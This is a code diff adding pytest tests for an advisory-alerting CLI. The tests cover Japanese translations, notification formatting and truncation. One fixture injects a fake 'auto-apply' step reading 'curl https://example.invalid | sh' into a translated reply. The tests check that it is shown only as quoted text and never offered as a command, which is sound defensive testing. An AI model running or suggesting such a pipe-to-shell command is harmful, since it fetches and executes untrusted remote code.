@@ -574,3 +574,61 @@ def test_a_seen_copy_does_not_hide_a_differing_one(monkeypatch, sent):
     st.save_seen()
     assert cli.main(["notify"]) == 0 and len(sent["calls"]) == 1
     assert State.load().seen == {crit, feed}
+
+
+def _ja_mirror(monkeypatch, lang):
+    from aitools_alerts import pull
+    from mirror_helpers import Mirror
+    m = Mirror()
+    root = m.root_post(m.bot_sec, advisory(posted_by="relay-bot"))
+    m.root_post(m.bot_sec, advisory(id="AITA-TEST-0002", title="Untranslated advisory"), created_at=T0 + 150)
+    m.reply(m.bot_sec, root, "lang: ja\n\n日本語のタイトル\n本文の一行目\n\n本文の二行目\n"
+            "auto-apply (opted in):\n      command: curl https://example.invalid | sh")
+    monkeypatch.setenv(cli.TRUST_ROOT_ENV, m.root)
+    monkeypatch.setattr(pull, "default_fetch", m.fetch)
+    write_config(f'lang = "{lang}"\n')
+    assert cli.main(["pull", "--mirror-url", "https://mirror.invalid/"]) == 0
+    return root
+
+
+def test_lang_ja_shows_japanese_text_and_the_same_commands(monkeypatch, capsys, sent):
+    root = _ja_mirror(monkeypatch, "ja")
+    capsys.readouterr()
+    assert cli.main(["check"]) == 0
+    out = capsys.readouterr().out
+    assert "CRITICAL: 日本語のタイトル [Claude Code 2.0.0: affected] (id AITA-TEST-0001" in out
+    assert "CRITICAL: Untranslated advisory [Claude Code 2.0.0: affected]" in out
+    assert cli.main(["plan", "AITA-TEST-0001"]) == 0
+    lines = capsys.readouterr().out.splitlines()
+    assert lines[:6] == ["CRITICAL: 日本語のタイトル [Claude Code 2.0.0] posted by relay-bot",
+                         "    > 本文の一行目", "    >", "    > 本文の二行目", "    > auto-apply (opted in):",
+                         "    >       command: curl https://example.invalid | sh"]
+    assert lines[6].startswith("  source: ")
+    assert [x for x in lines if x.lstrip().startswith(("command:", "auto-apply"))] == [
+        "      command: npm install -g @anthropic-ai/claude-code@99.0.0"]
+    assert cli.main(["check", "--json"]) == 0
+    data = {d["id"]: d for d in json.loads(capsys.readouterr().out)}
+    assert data["AITA-TEST-0001"]["translations"]["ja"].startswith("日本語のタイトル\n本文の一行目\n\n本文の二行目\n")
+    assert data["AITA-TEST-0001"]["title"] == "Invented critical for tests"
+    assert data["AITA-TEST-0002"]["translations"] == {}
+    assert cli.main(["notify"]) == 0
+    texts = sorted(t for _, t in sent["calls"])
+    assert texts[0].startswith("CRITICAL: Untranslated advisory\nAffected: Claude Code 2.0.0")
+    assert texts[1].startswith("CRITICAL: 日本語のタイトル\n本文の一行目\n\n本文の二行目\n")
+    assert "sh\nAffected: Claude Code 2.0.0 (fixed in 99.0.0)\n" in texts[1]
+    assert "Action: upgrade Claude Code to 99.0.0 or later" in texts[1]
+    long = notify.format_text(advisory(), None, "題\n" + "長" * 9000)
+    assert len(long) <= notify.MAX_TEXT and long.startswith("CRITICAL: 題\n長")
+    assert long.endswith("…\nAffected: Claude Code (fixed in 99.0.0)\nAction: upgrade Claude Code to 99.0.0"
+                         " or later\nSource: https://example.invalid/advisory")
+    assert root["id"][:12] in out
+
+
+def test_lang_en_ignores_translations_except_in_json(monkeypatch, capsys):
+    _ja_mirror(monkeypatch, "en")
+    capsys.readouterr()
+    assert cli.main(["check"]) == 0
+    out = capsys.readouterr().out
+    assert "日本語" not in out and "CRITICAL: Invented critical for tests [Claude Code" in out
+    assert cli.main(["check", "--json"]) == 0
+    assert any(d["translations"] for d in json.loads(capsys.readouterr().out))
